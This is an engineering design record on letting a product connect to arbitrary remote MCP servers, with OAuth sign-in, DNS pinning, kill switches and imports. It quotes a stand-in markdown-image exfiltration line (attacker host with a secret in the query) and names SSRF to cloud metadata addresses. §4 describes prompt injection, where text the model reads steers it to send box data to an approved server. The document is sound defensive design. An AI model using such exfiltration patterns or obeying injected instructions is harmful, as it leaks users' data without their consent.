# ADR-072: Connecting any MCP server — owner-added servers, per-member sign-in from a box with no public address, and trust in the servers an owner or admin approves

- **Status:** Proposed (2026-10-07). Acceptance is Romain's explicit sign-off, not a merge. Every open decision below is written with its recommended default, and the slices build against the defaults until the table in §10 is edited in place. **§4 decided by Romain, 2026-10-08:** an approved server is trusted with the data sent to it, and there is no per-argument leak check. **Admins may add servers as well as owners** (Romain, 2026-10-08).
- **Epic:** [WARP-320](https://warp-lab.atlassian.net/browse/WARP-320) · this ADR is [WARP-3900](https://warp-lab.atlassian.net/browse/WARP-3900). Romain's ask, 2026-10-07: *"I want to be able to use any MCP with droplet if needed. Mostly importing data and acting on distant systems without giving away user data that they haven't chosen to."*
- **Amends:** [`ADR-043`](ADR-043-outbound-mcp-client.md) §1 (owner-added servers beside the curated registry), §4 (what "tear down" means for a stateless protocol), §7 (a delegated per-member sign-in model), and two of its "not permitted" items (a callback URL; remote writes). [`ADR-042`](ADR-042-customer-supplied-credentials.md) §1 model 1 now applies to MCP servers, and this file is the revisit §3 and §8 said a redirect-based flow would need. Everything ADR-043 does not name here stands unchanged: annotations are never read, every tool defaults to `requiresWrite: true, requiresConfirmation: true`, demotion is a human act, and the socket lives outside the orchestrator.
- **Builds on:** [`ADR-041`](ADR-041-cloud-connector-class.md) (dial-out only; every destination registered; the local copy is the point), [`ADR-023`](ADR-023-public-ca-per-device-tls-via-hq-dns01.md) (the per-device public-CA name — still **Proposed**, its box half unbuilt), [`ADR-056`](ADR-056-agentic-extensibility.md) §B and §D (local servers live on the desktop client or in the sandbox; every unauthored source is classified locally), [`ADR-051`](ADR-051-company-brain.md) (imports land as files so the indexer, the ACL and the brain pick them up with no new code).
- **Number:** 072. Checked 2026-10-07: `origin/stage` carries `docs/ADR-*` up to `ADR-071`; no branch on `origin` adds an `ADR-072`-or-higher file; the handbook says the register for this repo is `docs/ADR-*.md` on onboard-services. A claimed number reserves nothing: re-check before merge.
- **Ground truth:** every path:line below was read on `origin/stage` `f8a712655` on 2026-10-07. Where the tree does not answer a question the text says UNVERIFIED and a follow-up tests it.

## Context

What "MCP" means on the box today is one vendor, read-only, under one shared credential, with no owner switch. Stated from the tree rather than from ADR-043's intent:

- **The server list is code.** `services/mcp-bridge/src/session-profiles.ts:4-10,192-198` is "a CLOSED registry, not a URL parameter" holding exactly one profile (Atlassian), whose URL is a literal (`atlassian.ts:68`). Adding a server means a bridge profile, a `track: "mcp"` descriptor, a `REMOTE_SERVER_DOMAINS` entry, a compiled tool table and an egress entry. An owner cannot add one.
- **The master switch is not built.** ADR-043 §4's `remote_mcp` channel is absent from `OffLanChannelKey` (`apps/orchestrator/prisma/schema.prisma:5178-5203`), from `OFF_LAN_CHANNEL_DEFAULTS` (`workspace-settings.service.ts:177-203`) and from `OFF_LAN_CHANNEL_KEYS` (`routes/off-lan-network.ts:26-40`); `config.ts:1377-1380` says so in its own words.
- **Remote writes cannot run at all.** Remote calls never reach the WARP-2305 interceptor; the multiplexer dispatches straight to the bridge (`mcp-multiplexer.service.ts:422-425`) after a synchronous policy that refuses every `requiresWrite` row with `REMOTE_WRITE_NOT_PERMITTED` (`remote-tool-classification.service.ts:383-391`). `InterceptableTool` was designed to admit a remote tool (`packages/tools-core/src/interceptor.ts:29-50`); nothing wires it.
- **The credential is box-wide.** One `IntegrationConnection` per provider, no owner column, found by `findFirst({ where: { provider } })` (`remote-mcp-gateway.service.ts:121`). Everyone whose turn calls an Atlassian tool acts as the pasted account, and the audit row says `actor: { type: "ai" }` (`:166-183`), not who asked.
- **Nothing checks what goes out.** Arguments are forwarded verbatim (`mcp-multiplexer.service.ts:422-425`; bridge `http-api.ts:533-546`). The confirmation card shows argument *shape* only — key, kind, size — and `shown: []` for any tool outside `APPROVAL_SHOWN_ARGUMENTS`, which is every remote tool (`confirmation-summary.ts:29-39,262`). The only defence is one sentence in the identity prompt (`identity-prompt.ts:33-34`).
- **The host guard is exact-match and nothing more.** `safe-url.ts:47-84` checks https, no userinfo, port 443 and set membership; it resolves no DNS and screens no address range. Safe today because the set is one public literal; unsafe for a URL a person typed. The orchestrator already has the right logic — `resolvePinnedDestination` (`apps/orchestrator/src/lib/outbound-url-guard.ts:518`) and `pinnedLookup` (`outbound-pinned-fetch.ts:45`) — but the bridge has no `@droplet/*` dependency (`services/mcp-bridge/Dockerfile:5-7`).
- **No OAuth.** `credentials.ts:31` knows `basic | bearer | none`; the comments at `atlassian.ts:15-19` and `credentials.ts:16-17` call OAuth a v1 non-goal "because there is no callback URL". Yet the box already runs three authorization-code flows against customer-registered apps — Google (`routes/google.ts:17,96`), Microsoft 365 (`routes/m365.ts:104,421`), SSO — with callbacks built by `trustedOriginUrl` (`lib/trusted-origin.ts:203-211`) on the canonical name `droplet-ai.lan` (`config.ts:494`) and a `CloudOAuthApp` table under the rule "No default fleet app" (`account-provider-setup.service.ts:6`). The vendor-side MCP world has moved: the 2026-07-28 revision deprecates dynamic client registration in favour of Client ID Metadata Documents (CIMD), is stateless, and retires sampling and roots; Notion, Slack, Google, Microsoft, HubSpot, Sentry and Granola are OAuth-only.
- **Drift detection sees names only** for vendor servers (`remote-session.ts:339-361`); the description-and-schema hash exists only on the `ext-*` attach path (`remote-mcp-servers.ts:614-623`). Tool descriptions reach the model unbounded (`mcp-multiplexer.service.ts:469-476`). Durable runs never see remote tools (`agent-run-worker.service.ts:297-313`). Client capabilities are already `{}` (`streamable-http.ts:172-174`).

Romain's ask has two halves that pull in opposite directions. "Any MCP" is a widening: a server nobody here reviewed, reached under a sign-in flow the box cannot host, by a person who is not the owner. "Without giving away user data they haven't chosen to" is a narrowing. Romain settled where the choice is made on 2026-10-08: **per server, when an owner approves it**, not per argument (§4). The business already trusts the vendor behind an approved server with its data. So this ADR spends its words on who may approve a server, how members sign in to it, and which hosts the box will dial. It keeps the rest to the minimum that makes "any server" true.

## Decision

### 1. Two tiers of server; owner-added is a row, never a tool

**Curated** stays exactly ADR-043's path: a bridge profile in code, an `allowed-egress.yaml` entry per host, a compiled tool table, a setup guide. Nothing here changes it.

**Owner-added** is new; the tier name covers admins too (Romain, 2026-10-08). An owner or admin adds any remote Streamable-HTTP MCP server at runtime, in the dashboard, as a `RemoteMcpServer` row: display name, exact URL, auth mode, an explicit `status` enum (`ENABLED | DISABLED`, never inferred from a missing row or a null token), and the issuer and token-endpoint hosts pinned at sign-in (§2). The route is `requireRole("owner", "admin")` (`middleware/auth.ts:690`; the roles are a list, not a hierarchy), never `requireRoleOrMcpService`, which would let the tool path in. Whoever may add a server may also review its tools; curated rows keep ADR-043's owner-only classification route (`routes/remote-tool-classifications.ts:17-19`). **There is no LLM tool that adds, edits, enables or removes a server**. The bridge gains one generic profile whose URL comes from the row and is guarded by: the exact host from the row; https on 443 only; `redirect: "error"` as today (`streamable-http.ts:109-110,135`); and **public-address-only DNS pinning** by porting `resolvePinnedDestination` / `pinnedLookup` into the bridge — refuse loopback, link-local, RFC 1918, CGNAT, ULA, multicast, the metadata addresses and this box, vet every answer, connect to the vetted address. The same screen runs on every OAuth discovery and token hop, which is where a hostile server would otherwise point the box at `169.254.169.254` or the router.

**Egress.** One entry in `docs/security/allowed-egress.yaml`, `id: owner-added-mcp`, `kind: dynamic`, `service: mcp-bridge`, `config_key: RemoteMcpServer.url` (plus the pinned issuer and token hosts on the same row), `data_class: user-content-on-request`. `docs/SECURITY.md:308-314` sanctions the shape; `:338-341` and `services/erp-connector/src/rest/host-guard.ts:1-17` say what it does not do — a dynamic entry contributes zero host patterns, so the code-side guard above is the enforcement and the entry is the review. **Romain's security review of that entry is the policy acceptance** for owner-added servers.

**Prerequisite.** The `remote_mcp` `OffLanChannelKey` ships first, exactly as ADR-043 §4 specifies (enum value, `OFF_LAN_CHANNEL_DEFAULTS` `{ enabled: false, requiresAdmin: true }`, `OFF_LAN_CHANNEL_KEYS`, parity test), as the master switch over both tiers. Owner-added servers do not land before it.

**Not on the box:** stdio servers. A local server lives on the desktop client (ADR-056 §B) or in `services/sandbox` (§C). **Open:** a LAN-hosted MCP server (one on the customer's own network). Default: not in this ADR — the pinning guard above refuses private addresses, so it is structurally excluded until a later decision admits it with its own guard.

### 2. Signing in from a box with no public address

The browser doing the consent is on the member's laptop; the box only dials out. So the redirect is a LAN-side leg and nothing becomes internet-reachable — the same shape the Google and Microsoft 365 callbacks already use.

**Redirect target: the box's trusted origin at `/api/mcp/oauth/callback`**, built by `trustedOriginUrl` like `google.ts:32,47`. Once ADR-023's box half lands (its items 3–5: issuance, split-horizon DNS, the FQDN as top-priority origin), that origin is the per-device public-CA name `d-<hmac>.devices.warp-lab.ai` — no public A record, split-horizon only, and the only form Google-shaped validators accept (`validateGoogleRedirectUri`, `account-provider-setup.service.ts:30-41`, rejects `.lan` and `.local`). Until then it is `https://droplet-ai.lan/...`, which the spec allows ("localhost or HTTPS") and which some authorization servers will refuse as policy. This explicitly amends ADR-043:134. **Honestly:** ADR-023 is Proposed, only its HQ half exists, and a box HQ does not know (the lab box, WARP-3704) never gets a name — so v1 must also work without one.

**Fallback: loopback plus paste.** The box offers `http://127.0.0.1/api/mcp/oauth/callback` (port-agnostic, RFC 8252 §7.3). The browser lands on a connection error; the member pastes the **full redirect URL** into the dashboard; a bare code is rejected. This is Claude Code's headless pattern. A listener on the laptop that catches the code cannot redeem it: the PKCE verifier never leaves the box and `state` is single-use.

**Client identity, in the spec's order of preference** (WARP-2401 builds the ladder): (1) a pre-registered client — the customer's own OAuth app, following the `CloudOAuthApp` precedent; (2) CIMD, if the authorization server advertises it and the box has a document to point at; (3) dynamic registration with `application_type`, deprecated but still what Granola and Linear offer; (4) a pasted client id and secret; (5) the existing API key or Bearer (`credentials.ts`). A fleet-wide single Warp Lab client identity stays not permitted (ADR-042 §1 model 2; Slack remains WARP-2373's).

**Also binding:** PKCE S256, refusing an authorization server whose metadata lacks `code_challenge_methods_supported`; RFC 8707 `resource` on both legs (WARP-2401); `state` and RFC 9207 `iss` checked on the callback (WARP-2405); credentials keyed by the authorization server's `issuer`, never reused across servers (SEP-2352); scope minimisation — request the challenged scope or the smallest documented set, and on `insufficient_scope` **ask the person before widening**, never silently. Token exchange and refresh run inside the bridge under §1's pinning; the tokens rest in WARP-2409/2412's store, decrypted only in the orchestrator for the duration of an `open`, as `readRemoteCredential` does today (`remote-mcp-servers.ts:489-500`).

### 3. Whose identity

**Default: per-member connections.** ADR-042 model 1 (delegated per-user) applies to MCP servers: one connection per member per server, holding a token that can read only what that member can. WARP-2409's model gains an explicit `principal: MEMBER | WORKSPACE` column and a `memberId` required when `MEMBER` (a CHECK, as `ADR-051` §9.1 does for `personal` rows) — never "null means Workspace".

**Workspace connection** is an admin's explicit choice with an acknowledgement on the form: *everyone allowed to use this server acts as this account and sees what it sees.* It is the only kind that may feed a Workspace import (§6).

**Who may use a server:** per-server role grants, WARP-2434's `AccessRoleConnectorGrant`. Owners and admins by default; members by grant; **guests never**. Whether a role-less `guest` can reach a remote read today through `narrowAllowedToolsForRole` (`routes/llm.ts:614-650`) is **UNVERIFIED** — Axis A would pass it (`tool-access.service.ts:349-356`) — and a test closes that before owner-added servers ship.

**Audit:** every remote call is audited with the requesting member, not `actor: { type: "ai" }`; the attribution the extension port already receives (`withRemoteCallAttribution`, `mcp-multiplexer.service.ts:45-48`) is written to the row. **Offboarding** a member revokes and deletes their connections with the rest of their data.

### 4. What may leave the box: approving a server is the choice

**Decided by Romain, 2026-10-08:** *"For now MCP approved by the admins/owners are judged safe since they are using a service that is already having the users data. No need to create an extra leak check there."*

The choice ADR-072 was asked to protect is made **once per server**: when an owner or admin adds it (§1) and decides who may use it (§3). Arguments sent to an approved server are **not screened**. There is no per-argument check, no exact-payload card for reads, and durable runs do not park on content.

**What still bounds data leaving the box:**

- The box dials only servers an owner or admin added, under §1's host guard. Data can go only to a vendor the business chose.
- Writes ask for a thumbs-up and destructive actions are blocked (§7). The product contract is unchanged.
- **Chat rendering is a different destination.** Remote images and link previews in model output or tool results are **never auto-loaded**. A `![](https://attacker/x?q=<secret>)` sends data to a host nobody approved, so this decision does not cover it. It is a requirement on the dashboard renderer, **UNVERIFIED** today, and a follow-up checks it.

**Accepted risk, written down so it is not marketed away.** Text the model reads can instruct it to send box data to an approved server: a file, an email, or another server's result. That includes data the requesting member can see but never named, and one approved server's results sent to another. Romain accepts this for v1 because every destination is a vendor the business chose. Product copy must therefore not promise that nothing leaves unless the person picked it item by item.

**Revisit** when either of these happens:

- Someone wants to add a server whose vendor the business does not already trust with the data the box holds.
- A Workspace must keep a class of data on the box, for example a regulated practice.

The design to start from then is the deterministic token-containment check with an exact-payload card, in this file's history at `1022114c1`.

### 5. Server-initiated pulls stay closed

Client capabilities stay `{}` (`streamable-http.ts:172-174`): no sampling, no roots, no elicitation. Any `InputRequiredResult` is refused as an error outcome the model can read, not answered. No URL-mode elicitation in v1. URLs and resource links inside results are **never fetched automatically**; `resources/read` is called only by an import recipe (§6). Tool descriptions sent to the model are capped at **800 characters** with a truncation marker; the reviewer sees the full text. **Every tool definition is pinned by a SHA-256 of the canonical wire object** (name, description, input schema, annotations), extending `remoteToolReviewHash` (`remote-tool-classification.service.ts:133-137`) from `ext-*` to every server; a changed definition returns the tool to unreviewed — not callable — until re-review, and owners and admins are told why. Tool results are labelled as untrusted data with server provenance before they reach the model — a follow-up, because today they are spliced in bare (`llm-agent.service.ts:3401-3430`).

### 6. Imports

An import is a **scheduled read** on `cron-runtime.service.ts` (never `while True`) that lands remote items as **markdown files with front matter** — `source`, `remote_id`, `imported_at`, `untrusted: true` — so the file indexer, the retrieval ACL and the company brain pick them up with no new brain code (ADR-051; the pattern of the Granola plan). Where a file lands follows **who owns the credential**: a member's connection lands in that member's personal folder; a Workspace connection lands in the Workspace folder, only by an admin's choice.

**The recipe is data,** not code: a list tool, a fetch tool, id and cursor JSON paths, a field map. Its arguments may contain only constants an admin typed into the recipe and values the same server returned. Recipe tools must be classified read; a recipe naming a write tool is refused at save.

**v1 scope.** Curated recipes ship in the repo for curated servers. For owner-added servers v1 offers **on-demand import through chat**: a read tool's result plus the existing save-a-file path, with a thumbs-up. A recipe editor comes later. Generic `resources/list` import is opportunistic only — of twelve vendor servers surveyed none documents resources as a primary surface.

**Lifecycle:** a read-only mirror (a remote edit overwrites; a local edit survives until then, and the file's banner says so); deterministic paths with the remote id in the name, so re-landing is an in-place re-index; a deletion sweep that removes what the source no longer returns; an explicit per-import state enum; purge offered on disconnect, default keep (ADR-041 §4); the 30-day leaver policy on personal folders; ADR-041's local-copy rules, including encryption where the store promises it.

**Worked example: Granola.** Its MCP is OAuth with dynamic registration only, no API key. Under this ADR a member signs in once through §2, and a recipe over its `list_meetings` / `get_meetings` tools lands their own private notes in their personal folder — which closes the Granola plan's personal-tier gap without the box holding anyone's Nextcloud app password. It still depends on that plan's background write-principal spike (the per-user brain-ingest route is the preferred answer).

### 7. Acting on remote systems

Remote calls route through the WARP-2305 interceptor as `InterceptableTool`s. `REMOTE_WRITE_NOT_PERMITTED` is lifted **only once WARP-2321's slices land** — the runtime deny tier (WARP-2432), fail-closed with no interceptor (WARP-2437), derived `WRITE_TOOLS` (WARP-2436), per-server grants (WARP-2434) and the audit row (WARP-2439). **Destructive means `denied`**, which is final and survives resets (`remote-tool-classification.service.ts:189-198`). A member's connection acts as that member. Durable runs may use remote **reads**; remote **writes park** for the person, always.

### 8. Protocol era

Speak the 2026-07-28 revision (stateless, per-request `_meta`, `server/discover`) and the legacy 2025-x versions through the spec's probe-and-fallback — modern first, `initialize` on a 400 without a modern error body. Atlassian pins `2025-11-25` today (`atlassian.ts:88`; `protocol-pin.ts`), and it is refused on mismatch; owner-added servers negotiate instead. ADR-043 §4's "tear down live sessions" restated for a protocol with no sessions: **refuse new requests, abort in-flight ones, close subscription streams**, and audit the refusal. The bridge's `close()` is already terminal (`remote-session.ts:398-414`).

### 9. Kill switches and offboarding

Three levels: the `remote_mcp` channel (owner, tears everything down); per-server `DISABLED` (owner or admin; the reconciler mounted at `apps/orchestrator/src/index.ts:561` detaches it within a tick); per-connection disconnect (the member, or an admin for a Workspace connection). **Disconnect** deletes the tokens, revokes them per RFC 7009 where the server advertises `revocation_endpoint`, deletes the dynamic registration where supported, and offers to purge that connection's imports. **Factory reset** crypto-shreds through `DEVICE_SECRET_KEY` as every `dcv1:` blob does (`column-crypto.service.ts:149-153`).

## 10. Decisions for Romain

| Decision | Options | Recommended default |
|---|---|---|
| CIMD hosting | (a) HQ publishes a **per-box** CIMD document under a Warp Lab domain — per-box identity, no secret, revocation scoped to one box; but Warp Lab enters the trust path and HQ becomes an availability dependency on every re-fetch. (b) No CIMD in v1: dynamic registration + the customer's own app + paste. | **(b) for v1.** Which authorization servers advertise CIMD today is unenumerated; (a) needs the HQ enrolment that the lab box lacks and ADR-023's acceptance. The ladder keeps the CIMD rung so (a) is a document to host, not a redesign. Re-decide when a target vendor requires CIMD or refuses DCR. |
| Redirect target | the trusted origin (per-device FQDN when issued, `droplet-ai.lan` otherwise) · loopback + paste | **Both**, trusted origin first, paste as fallback. Accepting ADR-023 is the only way the one-click path works against Google-shaped validators. |
| Workspace connections | per-member only · admin may also create a shared one | **Admin may**, with the acknowledgement in §3. Without it, no Workspace import exists. |
| Imports for owner-added servers in v1 | on-demand through chat · a recipe editor | **On-demand.** Curated recipes in the repo; the editor when a second customer asks. |
| LAN-hosted MCP servers | admit with a LAN guard · not in this ADR | **Not in this ADR.** |
| Outbound leak check | token containment · none, approving the server is the choice | **Decided by Romain, 2026-10-08: none** for approved servers. The accepted risk and the revisit trigger are in §4. |
| Egress entry `owner-added-mcp` | — | Romain's security review of that entry is the acceptance of the policy. |

## What this ADR does not permit

- Adding, editing, enabling or disabling a server from an LLM tool, or from any role other than owner or admin.
- Dialing an owner-added host before the `remote_mcp` channel exists and is on.
- A server URL that is not https on 443, that redirects, or that resolves to any non-public address — on the MCP hop, the discovery hop or the token hop.
- A stdio server on the box, or a LAN-hosted MCP server.
- A fleet-wide Warp Lab client identity; a Warp Lab client secret on a box.
- Accepting a bare authorization code; accepting a callback without `state` and, when present, `iss`.
- Silently widening scope on `insufficient_scope`.
- The Kev decision model, or any model, on the approval path.
- Advertising sampling, roots or elicitation; answering an `InputRequiredResult`; auto-fetching a URL or resource link from a result; auto-loading a remote image or link preview in chat.
- Calling a tool whose pinned definition changed since review.
- A remote write before WARP-2321's slices; a remote write from a durable run without parking.
- A guest reaching any remote tool.
- A Workspace import from a member's connection, or a personal import landing outside that member's folder.

## Consequences

**Better.** The box reaches any server a business already pays for, under the person's own identity. Data leaves only to servers an owner or admin approved, and nothing is written remotely without a thumbs-up. Imports arrive as files, so every downstream feature works unchanged.

**Harder.** A fourth OAuth flow on the box, with discovery against untrusted metadata; a per-member token store where there was one row per provider; a bridge that must now resolve DNS and pin addresses; and the accepted risk in §4, which must stay documented rather than marketed: an approved server can receive box data the person never named. Tool catalogs multiply against a context budget that is already short (ADR-043 Consequences): per-turn selection (WARP-2348) stays the gate, and an owner adding a 60-tool server must be told what it costs.

## Follow-ups

| Slice | Ticket |
|---|---|
| Ship the `remote_mcp` off-LAN channel as the master switch (enum, defaults, keys, parity test; teardown on off) | new — *remote_mcp channel: enum value, defaults and teardown* |
| Owner-added server rows, the dashboard form and the generic bridge profile | new — *Owner-added MCP servers: row, owner-and-admin route, generic bridge profile* |
| Port public-address pinning into the bridge; apply it to MCP, discovery and token hops | new — *Bridge DNS pinning for owner-added hosts and OAuth hops* |
| `owner-added-mcp` dynamic egress entry, Romain's security review | new — *Register owner-added MCP hosts as kind: dynamic* |
| CIMD-first ladder, PKCE refusal, `resource` | WARP-2401 |
| Callback route, `state` + `iss`, loopback paste fallback | WARP-2405 (extend AC with the paste path) |
| Per-member and Workspace connection model with `principal`, `NEEDS_RECONNECT` | WARP-2409 (extend with `principal` / `memberId`) |
| Token key derivation, AAD-bound | WARP-2412 |
| Proactive refresh on `cron-runtime` | WARP-2416 |
| Per-server role grants; guests never; the UNVERIFIED guest path tested | WARP-2434 + new — *Test: role-less guest cannot reach a remote read* |
| Requesting member on every remote audit row | WARP-2439 (extend AC) |
| Chat renderer never auto-loads remote images or link previews | new — *Verify and enforce no zero-click fetch in chat rendering* |
| Pin every remote tool definition by hash; unreviewed on change | new — *Tool-definition pinning beyond ext-\** |
| Cap tool descriptions to the model; full text to the reviewer | new — *Remote tool description cap* |
| Label tool results as untrusted with server provenance | new — *Provenance labels on remote tool results* |
| Route remote calls through the interceptor; lift `REMOTE_WRITE_NOT_PERMITTED` | WARP-2437, WARP-2432, WARP-2436 (the deny tier set) |
| Probe-and-fallback across protocol eras | new — *Speak 2026-07-28 and legacy MCP revisions* |
| Import recipes as data; curated recipes; on-demand chat import; deletion sweep | new — *Import recipes: schema, scheduler, landing and sweep* |
| Granola personal-tier import over MCP | new, after the Granola plan's write-principal spike |
| Disconnect revokes (RFC 7009), deletes registration, offers purge | new — *Connection disconnect: revoke, deregister, purge* |
| Dashboard review screen for vendor and owner-added tool rows (today `ToolReview.tsx` is `ext-*` only) | WARP-2430 (extend) |
